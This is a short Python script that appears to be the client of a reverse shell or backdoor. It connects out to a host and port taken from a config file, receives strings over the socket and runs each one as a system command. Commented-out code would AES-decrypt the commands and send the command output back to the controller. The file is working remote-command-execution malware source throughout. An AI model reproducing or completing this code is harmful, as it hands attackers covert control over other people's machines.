#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import sys
from Crypto.Cipher import AES
from utils import decrypt, encrypt
from config import HOST_CLIENT, PORT_CLIENT, KEY_CLIENT
import os
from subprocess import Popen, PIPE

def main():

    s = socket.socket()
    s.connect((HOST_CLIENT, PORT_CLIENT))

    while True:
        data = s.recv(1024)
        
        if data:

            os.system('clear')
            cmd = data.decode()
            print(cmd)
            process = Popen(cmd.split(), stdout=PIPE, stderr=PIPE)
            stdout, stderr = process.communicate()
            print(stdout)
            print('-'*30)
            print(stderr)

        #cmd = decrypt(data,KEY_CLIENT)

        # if cmd == 'quit':
        #     s.close()
        #     sys.exit(0)
        
        #
        #results = os.popen(cmd).read()
        #s.sendall(bytes(encrypt(results).encode()))

if __name__ == '__main__':
    main()
